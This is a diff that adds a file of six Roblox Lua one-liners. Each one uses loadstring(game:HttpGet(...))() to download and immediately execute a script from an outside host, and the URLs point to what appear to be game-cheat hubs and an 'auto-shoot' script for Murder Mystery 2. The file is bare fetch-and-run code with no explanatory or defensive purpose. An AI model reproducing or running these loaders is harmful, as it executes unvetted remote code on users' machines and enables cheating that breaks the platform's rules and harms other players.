@@ -1,0 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Uras1sib/sab/refs/heads/main/bas.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FyroxScript/OnyxHub/refs/heads/main/Loader"))()
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8ece73b0613822a2310ef305b9fa3b4aba3f5ff10a56a4b5b8019059eb02187a/download"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-nexus-updated-15270"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Uras1sib/sab/refs/heads/main/emoji.lua"))()
